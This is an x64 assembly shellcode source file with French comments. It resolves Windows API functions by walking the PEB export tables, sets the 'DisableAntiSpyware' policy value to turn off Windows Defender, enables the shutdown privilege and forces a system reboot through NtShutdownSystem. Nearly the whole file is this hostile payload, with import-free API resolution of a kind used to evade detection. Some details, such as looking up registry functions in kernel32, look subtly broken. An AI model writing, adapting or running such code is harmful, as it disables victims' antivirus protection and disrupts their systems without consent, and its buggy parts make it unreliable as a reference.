[BITS 64]
section .data
    keypath db "SOFTWARE\Policies\Microsoft\Windows Defender",0
    valuename db "DisableAntiSpyware",0
	dwordval dd 1                      ; Valeur à écrire
	hKey dd 0
	saved_rax dq 0
    saved_rbx dq 0
    saved_rcx dq 0
    saved_rdx dq 0
    saved_rbp dq 0
    saved_rsp dq 0
    saved_rsi dq 0
    saved_rdi dq 0
    saved_r8  dq 0
    saved_r9  dq 0
    saved_r10 dq 0
    saved_r11 dq 0
    saved_r12 dq 0
    saved_r13 dq 0
    saved_r14 dq 0
    saved_r15 dq 0
	
	peb_saved_rax dq 0
    peb_saved_rbx dq 0
    peb_saved_rcx dq 0
    peb_saved_r8  dq 0
    peb_saved_r9  dq 0
    peb_saved_r10 dq 0
	peb_saved_r11 dq 0
	
	advapi_saved_rax dq 0
	advapi_saved_rbx dq 0
	advapi_saved_rcx dq 0
	advapi_saved_r8  dq 0
	advapi_saved_r9  dq 0
	advapi_saved_r10 dq 0
	advapi_saved_r11 dq 0

section .text
    global _start

_start:

	mov [rel saved_rax], rax
    mov [rel saved_rbx], rbx
    mov [rel saved_rcx], rcx
    mov [rel saved_rdx], rdx
    mov [rel saved_rbp], rbp
    mov [rel saved_rsp], rsp
    mov [rel saved_rsi], rsi
    mov [rel saved_rdi], rdi
    mov [rel saved_r8], r8
    mov [rel saved_r9], r9
    mov [rel saved_r10], r10
    mov [rel saved_r11], r11
    mov [rel saved_r12], r12
    mov [rel saved_r13], r13
    mov [rel saved_r14], r14
    mov [rel saved_r15], r15
	xor rdx, rdx
	mov rax, gs:[rdx + 0x60]    
	mov rax, [rax + 0x18]       
	mov rsi, [rax + 0x20]       

find_ntdll:
    mov rbx, [rsi + 0x20]      
    mov rax, [rsi + 0x50]      
    mov rsi, [rsi]             
    
    test rax, rax
    jz find_ntdll
    
    cmp word [rax], 'n'
    jne find_ntdll
    cmp word [rax + 2], 't'
    jne find_ntdll
    cmp word [rax + 4], 'd'
    jne find_ntdll
    cmp word [rax + 6], 'l'
    jne find_ntdll
    
    mov rax, rbx
    mov ebx, [rax + 0x3C]      
    add rbx, rax               
    mov ebx, [rbx + 0x88]      
    add rbx, rax               
    mov ecx, [rbx + 0x18]      
    mov r8d, [rbx + 0x20]      
    add r8, rax                
    mov r9d, [rbx + 0x24]      
    add r9, rax                
    mov r10d, [rbx + 0x1C]     
    add r10, rax               

    mov [rel advapi_saved_rax], rax
    mov [rel advapi_saved_rbx], rbx
    mov [rel advapi_saved_rcx], rcx
    mov [rel advapi_saved_r8], r8
    mov [rel advapi_saved_r9], r9
    mov [rel advapi_saved_r10], r10
    mov [rel advapi_saved_r11], r11

	
	
	; Pour Kernel32
    xor rdx, rdx
    mov rax, gs:[rdx + 0x60]    ; PEB
    mov rax, [rax + 0x18]       ; LDR
    mov rsi, [rax + 0x20]       ; First module

next_mod:
    mov rbx, [rsi + 0x20]       ; DLL base address
    mov rax, [rsi + 0x50]       ; Unicode string DLL name
    mov rsi, [rsi]              ; Next module
    
    test rax, rax
    jz next_mod
    
    cmp word [rax], 'K'
    jne next_mod
    cmp word [rax + 2], 'E'
    jne next_mod
    cmp word [rax + 4], 'R'
    jne next_mod
    cmp word [rax + 6], 'N'
    jne next_mod
    
    mov rax, rbx  

	mov ebx, [rax + 0x3C]       ; e_lfanew offset
	add rbx, rax                ; PE Header
	mov ebx, [rbx + 0x88]       ; Export Directory RVA
	add rbx, rax                ; Export Directory VA

	; Maintenant on peut accéder aux tables d'export
	mov ecx, [rbx + 0x18]       ; NumberOfNames
	mov r8d, [rbx + 0x20]       ; AddressOfNames RVA
	add r8, rax                 ; AddressOfNames VA
	mov r9d, [rbx + 0x24]       ; AddressOfNameOrdinals RVA
	add r9, rax                 ; AddressOfNameOrdinals VA
	mov r10d, [rbx + 0x1C]      ; AddressOfFunctions RVA
	add r10, rax                ; AddressOfFunctions VA
	
	mov [rel peb_saved_rax], rax
    mov [rel peb_saved_rbx], rbx
    mov [rel peb_saved_rcx], rcx
    mov [rel peb_saved_r8], r8
    mov [rel peb_saved_r9], r9
    mov [rel peb_saved_r10], r10
	mov [rel peb_saved_r11], r11
	
	
	
	
find_sleep:
    mov r11d, [r8 + rdx*4]  
    add r11, rax            
    
    cmp byte [r11], 'S'
    jne next_func
    cmp byte [r11+1], 'l'
    jne next_func
    cmp byte [r11+2], 'e'
    jne next_func
    cmp byte [r11+3], 'e'
    jne next_func
    cmp byte [r11+4], 'p'
    je found_sleep
    
next_func:
    inc rdx
    cmp rdx, rcx           
    jb find_sleep 
    
found_sleep:
    movzx edx, word [r9 + rdx*2]  ; Obtenir l'ordinal
    mov edx, [r10 + rdx*4]        ; Obtenir le RVA de la fonction
	
	
    add rax, rdx                   ; Convertir en VA - RAX contient maintenant l'adresse de Sleep
	
	mov rcx, 60000    ; 5000 ms = 5 secondes
	call rax         ; Appel de Sleep
	
	
	mov rax, [rel peb_saved_rax]
    mov rbx, [rel peb_saved_rbx]
    mov rcx, [rel peb_saved_rcx]
    mov r8,  [rel peb_saved_r8]
    mov r9,  [rel peb_saved_r9]
    mov r10, [rel peb_saved_r10]
	mov r11, [rel peb_saved_r11]
    
	
	xor rdx, rdx 
	
find_openkey:
    mov r11d, [r8 + rdx*4]  
    add r11, rax            
    
    cmp byte [r11], 'R'
    jne next_openkey
    cmp byte [r11+1], 'e'
    jne next_openkey
    cmp byte [r11+2], 'g'
    jne next_openkey
    cmp byte [r11+3], 'O'
    jne next_openkey
    cmp byte [r11+4], 'p'
    jne next_openkey
    cmp byte [r11+5], 'e'
    jne next_openkey
    cmp byte [r11+6], 'n'
    jne next_openkey
    cmp byte [r11+7], 'K'
    jne next_openkey
    cmp byte [r11+8], 'e'
    jne next_openkey
    cmp byte [r11+9], 'y'
    jne next_openkey
    cmp byte [r11+10], 'E'
    jne next_openkey
    cmp byte [r11+11], 'x'
    jne next_openkey
    cmp byte [r11+12], 'A'
    je found_openkey

next_openkey:
    inc rdx
    cmp rdx, rcx           
    jb find_openkey

found_openkey:
    movzx edx, word [r9 + rdx*2]
    mov edx, [r10 + rdx*4]
    

    ; Save kernel32 base in r12 before the call
    mov r12, rax  ; Preserve kernel32 base
    mov r13, r8
	mov r14, r9
	mov r15, r10
	
	add rax, rdx

    ; Call RegOpenKeyExA
    sub rsp, 88
    mov rcx, 0x80000002    
    lea rdx, [rel keypath]
    xor r8, r8             
    mov r9d, 0xF003F       
    lea r10, [rel hKey]
    mov qword [rsp+32], r10
    call rax

    ; Restore saved values
   
    mov rax, r12  ; Restore kernel32 base
	mov r8, r13  
	mov r9, r14
	mov r10, r15
    xor rdx, rdx  ; Reset counter for next search

find_setvalue:
    mov r11d, [r8 + rdx*4]  
    add r11, rax            
    
    cmp byte [r11], 'R'
    jne next_setvalue
    cmp byte [r11+1], 'e'
    jne next_setvalue
    cmp byte [r11+2], 'g'
    jne next_setvalue
    cmp byte [r11+3], 'S'
    jne next_setvalue
    cmp byte [r11+4], 'e'
    jne next_setvalue
    cmp byte [r11+5], 't'
    jne next_setvalue
    cmp byte [r11+6], 'V'
    jne next_setvalue
    cmp byte [r11+7], 'a'
    jne next_setvalue
    cmp byte [r11+8], 'l'
    jne next_setvalue
    cmp byte [r11+9], 'u'
    jne next_setvalue
    cmp byte [r11+10], 'e'
    jne next_setvalue
    cmp byte [r11+11], 'E'
    jne next_setvalue
    cmp byte [r11+12], 'x'
    jne next_setvalue
    cmp byte [r11+13], 'A'
    je found_setvalue

next_setvalue:
    inc rdx
    cmp rdx, rcx           
    jb find_setvalue

found_setvalue:
    movzx edx, word [r9 + rdx*2]
    mov edx, [r10 + rdx*4]
    add rax, rdx

    ; Call RegSetValueExA
    sub rsp, 80
    mov rcx, [rel hKey]     ; On utilise le handle obtenu précédemment
    lea rdx, [rel valuename] ; Nom de la valeur
    xor r8, r8              ; Reserved = 0
    mov r9d, 4              ; REG_DWORD
    lea r10, [rel dwordval]
    mov qword [rsp+32], r10
    mov qword [rsp+40], 4   ; Size of DWORD
    call rax
	
	
	mov rax, [rel advapi_saved_rax]
    mov rbx, [rel advapi_saved_rbx]
    mov rcx, [rel advapi_saved_rcx]
    mov r8,  [rel advapi_saved_r8]
    mov r9,  [rel advapi_saved_r9]
    mov r10, [rel advapi_saved_r10]
	mov r11, [rel advapi_saved_r11]
	
	xor rdx, rdx                ; Reset counter
	
find_rtladjust:
    mov r11d, [r8 + rdx*4]  
    add r11, rax            
    
    cmp byte [r11], 'R'
    jne next_rtl
    cmp byte [r11+1], 't'
    jne next_rtl
    cmp byte [r11+2], 'l'
    jne next_rtl
    cmp byte [r11+3], 'A'
    jne next_rtl
    cmp byte [r11+4], 'd'
    jne next_rtl
    cmp byte [r11+5], 'j'
    jne next_rtl
    cmp byte [r11+6], 'u'
    jne next_rtl
    cmp byte [r11+7], 's'
    jne next_rtl
    cmp byte [r11+8], 't'
    je found_rtl

next_rtl:
    inc rdx
    cmp rdx, rcx           
    jb find_rtladjust

found_rtl:
    movzx edx, word [r9 + rdx*2]
    mov edx, [r10 + rdx*4]
    add rax, rdx

    ; Appel RtlAdjustPrivilege
    sub rsp, 40
    mov rcx, 19    ; SeShutdownPrivilege
    mov rdx, 1     ; Enable
    xor r8, r8     ; CurrentThread
    mov r9, rsp    ; PreviousValue
    call rax
	
	mov rax, [rel advapi_saved_rax]
    mov rbx, [rel advapi_saved_rbx]
    mov rcx, [rel advapi_saved_rcx]
    mov r8,  [rel advapi_saved_r8]
    mov r9,  [rel advapi_saved_r9]
    mov r10, [rel advapi_saved_r10]
	mov r11, [rel advapi_saved_r11]
	
	xor rdx, rdx                ; Reset counter
	
find_ntshutdown:
    mov r11d, [r8 + rdx*4]  
    add r11, rax            
    
    cmp byte [r11], 'N'
    jne next_ntshutdown
    cmp byte [r11+1], 't'
    jne next_ntshutdown
    cmp byte [r11+2], 'S'
    jne next_ntshutdown
    cmp byte [r11+3], 'h'
    jne next_ntshutdown
    cmp byte [r11+4], 'u'
    jne next_ntshutdown
    cmp byte [r11+5], 't'
    jne next_ntshutdown
    cmp byte [r11+6], 'd'
    jne next_ntshutdown
    cmp byte [r11+7], 'o'
    jne next_ntshutdown
    cmp byte [r11+8], 'w'
    jne next_ntshutdown
    cmp byte [r11+9], 'n'
    je found_ntshutdown

next_ntshutdown:
    inc rdx
    cmp rdx, rcx           
    jb find_ntshutdown

found_ntshutdown:
    movzx edx, word [r9 + rdx*2]
    mov edx, [r10 + rdx*4]
    add rax, rdx

    ; Setup and call NtShutdownSystem
    mov rcx, 1    ; ShutdownReboot
    call rax
	
	
	
	
	mov rax, [rel saved_rax]
    mov rbx, [rel saved_rbx]
    mov rcx, [rel saved_rcx]
    mov rdx, [rel saved_rdx]
    mov rbp, [rel saved_rbp]
    mov rsp, [rel saved_rsp]
    mov rsi, [rel saved_rsi]
    mov rdi, [rel saved_rdi]
    mov r8,  [rel saved_r8]
    mov r9,  [rel saved_r9]
    mov r10, [rel saved_r10]
    mov r11, [rel saved_r11]
    mov r12, [rel saved_r12]
    mov r13, [rel saved_r13]
    mov r14, [rel saved_r14]
    mov r15, [rel saved_r15]
    db 0x00, 0x00, 0x00, 0x00, 0x00  ;

	
	